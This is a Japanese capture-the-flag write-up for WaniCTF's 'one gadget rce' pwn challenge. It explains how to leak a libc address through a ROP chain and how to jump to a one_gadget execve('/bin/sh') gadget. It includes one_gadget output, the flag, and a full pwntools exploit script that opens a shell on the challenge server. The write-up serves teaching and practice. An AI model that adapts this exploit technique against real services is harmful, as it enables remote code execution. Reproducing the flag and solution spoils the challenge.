# one gadget rce [pwn]
## 問題文

```
nc rce.wanictf.org 9007
```

+ ROPを使ったlibcのロードアドレスのリークを理解する必要があります。
+ libc上にあるone gadget RCE (Remote Code Execution)の探し方と呼び出し方を理解する必要があります。
+ `one_gadget libc-2.27.so`


### 使用ツール例

+ [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)
+ [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)
+ [ROPgadget](https://github.com/wani-hackase/memo-setup-pwn-utils#ROPgadget)
+ [one_gadget](https://github.com/wani-hackase/memo-setup-pwn-utils#one_gadget)

### セキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ *Stack Smash Protection (SSP)無効*
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG
```
FLAG{mem0ry-1eak-4nd-0ne-gadget-rem0te-ce}
```
## 解法

以下の手順で/bin/shを実行します。

1. 「read関数のGOTを引数としてputs関数で呼んでlibc上のread関数のロードアドレスをリークする」ROPを実行
2. libc上のread関数のアドレスとリークしたアドレスからlibcがロードされた先頭アドレスを算出
3. 「libcがロードされた先頭アドレスからone gadget RCEのアドレスを計算してone gadget RCEを呼び出す」ROPを実行

まず、`objdump -d -M intel ./pwn07`で必要なアドレスを調べます。
リークで使うputsのアドレス、リークで出力させるread関数のGOTアドレス、一度リークさせた後に再度プログラムを最初から実行してbuffer over flowを起こさせるための_startのアドレスをそれぞれ調べます。
read関数のGOTアドレスにはロードされたlibc上のreadのアドレスが実行時にロードされているのでputsでread関数のGOTアドレスを引数にしてputsを呼び出すとロードされたlibc上のreadのアドレスが入手できます。

```
addr_puts_plt = 0x400650
addr_read_got = 0x601050
addr_start = 0x4006c0
```

puts関数を呼ぶときの第一引数を設定するためにしようするROP gadgetを`ROPgadget --binary ./pwn07`で探します。
第一引数はRDIレジスタに入れるのでpop_rdiのROPガジェットを探します。

```
addr_pop_rdi = 0x400a13
```

次に、libc上のread関数のアドレスを`objdump -d -M intel ./libc-2.27.so`で調べます。
`__read@@GLIBC_2.2.5`のアドレスがlibc上のread関数のアドレスになります。

```
addr_read_libc = 0x110140
```

最後に、libc上のone gadget RCEを探します。
one gadget RCEとは、libc上のそのアドレスに飛ばせばシェルが起動できるgadgetです。
今回のlibcには3つのone gadget RCEがあります。

```
% one_gadget libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

この3つはそれぞれシェルが起動できる制約条件が異なるので3つのアドレスをメモって試します。
今回の場合、3つ目が刺さるはずです。

```
addr_one_gadget_libc = 0x4f3d5
addr_one_gadget_libc = 0x4f432
addr_one_gadget_libc = 0x10a41c
```

以上を組み合わせたexploitコードは以下の通りです。

```
import pwn

io = pwn.remote("rce.wanictf.org", 9007)

ret = io.readuntil("What's your name?: ")
print(ret)

addr_puts_plt = 0x400650
addr_read_got = 0x601050
addr_start = 0x4006c0

addr_pop_rdi = 0x400a13

addr_read_libc = 0x110140

#addr_one_gadget_libc = 0x4f3d5
#addr_one_gadget_libc = 0x4f432
addr_one_gadget_libc = 0x10a41c

## リーク用のROPを送信
s = b"A" * 22
s += pwn.p64(addr_pop_rdi)
s += pwn.p64(addr_read_got)
s += pwn.p64(addr_puts_plt)
s += pwn.p64(addr_start)

io.send(s)


## リークしたアドレスを用いてone gadget RCEのアドレスを計算
ret = io.read()
ret = io.read()

trim_start = ret.find(b"\n\n") + 1
trim_start = ret.find(b"\n\n", trim_start) + len(b"\n\n")
trim_end = ret.find(b"\nWelcome", trim_start)

s = ret[trim_start:trim_end]
s = s + b"\x00" * (8 - len(s))

addr_read_leak = pwn.u64(s) 
addr_libc_base = addr_read_leak - addr_read_libc
addr_one_gadget = addr_libc_base + addr_one_gadget_libc


## one gadget RCEを投げる
s = b"A" * 22
s += pwn.p64(addr_one_gadget)

io.send(s)

io.interactive()
```
